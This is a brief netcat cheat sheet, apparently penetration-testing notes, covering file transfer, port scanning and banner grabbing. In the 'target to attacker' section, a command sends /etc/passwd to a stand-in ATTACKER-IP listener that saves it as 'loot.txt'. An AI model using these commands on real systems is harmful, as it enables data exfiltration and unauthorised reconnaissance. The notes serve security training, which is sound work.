## File Transfer with Netcat

### Send file from attacker to target

**Receiver (target):**
```bash
nc -lvnp 4444 > received_file.txt
```

**Sender (attacker):**
```bash
nc TARGET-IP 4444 < file_to_send.txt
```

### Send file from target to attacker

**Receiver (attacker):**
```bash
nc -lvnp 4444 > loot.txt
```

**Sender (target):**
```bash
nc ATTACKER-IP 4444 < /etc/passwd
```

---

## Port Scanning with Netcat

```bash
# Scan a range of ports
nc -zv 192.168.1.1 1-1000

# Check a single port
nc -zv 192.168.1.1 22
```

| Flag | Meaning |
|------|---------|
| `-z` | Zero I/O mode — just scan, don't send data |
| `-v` | Show results |

---

## Banner Grabbing

```bash
nc -nv 192.168.1.1 22
nc -nv 192.168.1.1 80
nc -nv 192.168.1.1 25
```

Connect and the service usually announces itself — reveals software and version.

